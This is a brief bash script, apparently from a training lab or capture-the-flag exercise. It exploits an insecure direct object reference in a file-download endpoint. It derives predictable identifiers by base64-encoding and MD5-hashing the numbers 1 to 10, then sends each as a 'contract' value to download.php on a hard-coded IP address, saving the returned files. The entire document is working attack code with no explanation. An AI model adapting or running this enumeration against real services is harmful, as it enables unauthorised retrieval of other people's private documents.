#!/bin/bash

for i in {1..10}; do
  for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
  
    curl -sOJ -X POST -d "contract=$hash" http://94.237.48.12:40071/download.php
  done
done
